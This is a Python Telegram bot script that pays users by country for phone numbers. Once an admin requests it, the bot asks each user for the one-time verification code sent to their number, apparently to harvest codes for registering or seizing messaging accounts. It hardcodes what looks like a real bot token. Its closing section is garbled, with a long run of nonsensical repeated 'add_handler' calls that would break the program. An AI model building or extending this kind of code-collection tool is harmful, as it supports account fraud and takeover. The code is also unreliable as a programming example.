import os
import json
import logging
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# --- CONFIG ---
TOKEN = "8266639049:AAFvQYw-ax6y94S2zH_oMg7jA2Q1Dxh6yro"
ADMIN_ID = 1378825382
CHANNEL_LINK = "https://t.me/NR_receiver_News"

# --- STORAGE ---
USER_FILE = "users.json"
ORDER_FILE = "orders.json"

def load_data(file):
    if not os.path.exists(file):
        return {}
    with open(file, "r") as f:
        return json.load(f)

def save_data(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

users = load_data(USER_FILE)
orders = load_data(ORDER_FILE)

# --- LOGGER ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- BOT APP ---
app = Flask(__name__)
application = Application.builder().token(TOKEN).build()

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user = update.effective_user

    if user_id not in users:
        users[user_id] = {
            "name": user.full_name,
            "balance": 0.0,
            "referrals": 0,
            "accounts_sold": 0,
        }
        save_data(USER_FILE, users)

        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
                    [InlineKeyboardButton("➡️ Continue to Menu", callback_data="continue_menu")]]
        await update.message.reply_text("👋 Welcome! Please join our channel first:", 
                                        reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxx\n\n"
            "Type /cap to see available countries."
        )

async def cap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """📋 Available Countries

🇵🇭 +63  | 💰 0.65$ | ⏰ 1800s
🇸🇻 +503 | 💰 0.70$ | ⏰ 600s
🇮🇱 +972 | 💰 0.80$ | ⏰ 1800s
🇵🇸 +970 | 💰 0.85$ | ⏰ 600s
🇳🇿 +64  | 💰 1.10$ | ⏰ 600s
🇹🇷 +90  | 💰 1.15$ | ⏰ 600s
🇲🇩 +373 | 💰 1.15$ | ⏰ 600s
🇬🇱 +299 | 💰 1.45$ | ⏰ 600s
🇨🇿 +420 | 💰 1.65$ | ⏰ 600s
🇹🇼 +886 | 💰 2.10$ | ⏰ 600s
🇳🇱 +31  | 💰 2.15$ | ⏰ 600s
🇪🇸 +34  | 💰 3.40$ | ⏰ 600s
🇫🇷 +33  | 💰 3.50$ | ⏰ 600s
🇩🇪 +49  | 💰 4.00$ | ⏰ 600s

🌍 Total Countries: 14
"""
    await update.message.reply_text(text)

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in users:
        await update.message.reply_text("⚠️ You don’t have a profile yet. Type /start first.")
        return
    
    user = users[user_id]
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    text = (
        f"👤 Name: {user['name']}\n"
        f"💰 Balance: ${user['balance']:.2f}\n"
        f"👥 Total Referrals: {user['referrals']}\n"
        f"📱 Accounts Sold: {user['accounts_sold']}\n"
        f"🕒 Last Check: {now}"
    )

    keyboard = [[InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# --- MSG HANDLER (numbers + otp) ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = str(update.effective_user.id)

    # detect phone number
    if text.startswith("+") and text[1:].isdigit():
        orders[user_id] = {"number": text, "status": "pending"}
        save_data(ORDER_FILE, orders)

        await update.message.reply_text("⏳ Processing please wait...")
        
        # send to admin
        keyboard = [
            [InlineKeyboardButton("✅ Request OTP", callback_data=f"reqotp_{user_id}")],
            [InlineKeyboardButton("❌ Cancel Deal", callback_data=f"cancel_{user_id}")]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📩 New number submitted:\n{text}\nUser ID: {user_id}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# --- CALLBACK HANDLER ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "withdraw":
        user_id = str(query.from_user.id)
        bal = users[user_id]["balance"]
        if bal < 3:
            await query.edit_message_text("⚠️ Insufficient balance (minimum $3).")
        else:
            await query.edit_message_text("✅ Withdrawal request submitted!")
    elif data.startswith("reqotp_"):
        user_id = data.split("_")[1]
        num = orders[user_id]["number"]
        await context.bot.send_message(chat_id=user_id, text=f"🇹🇼 Enter the code sent to the number {num}")
    elif data.startswith("cancel_"):
        user_id = data.split("_")[1]
        await context.bot.send_message(chat_id=user_id, text="❌ Your deal has been cancelled by admin.")
        del orders[user_id]
        save_data(ORDER_FILE, orders)

# --- HELP ---
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Available commands: /start, /cap, /balance, /cancel, /help")

# --- SETUP HANDLERS ---
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("cap", cap))
application.add_handler(CommandHandler("balance", balance))
application.add_handler(CommandHandler("help", help_cmd))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
application.add_handler(MessageHandler(filters.COMMAND, help_cmd))
application.add_handler(MessageHandler(filters.TEXT, handle_message))
application.add_handler(MessageHandler(filters.ALL, handle_message))
application.add_handler(MessageHandler(filters.ALL, handle_message))
application.add_handler(application.add_handler)

application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)
application.add_handler(application.add_handler)

# --- FLASK ROUTE ---
@app.route("/webhook", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    application.update_queue.put_nowait(update)
    return "ok"

@app.route("/")
def home():
    return "Bot is running!", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
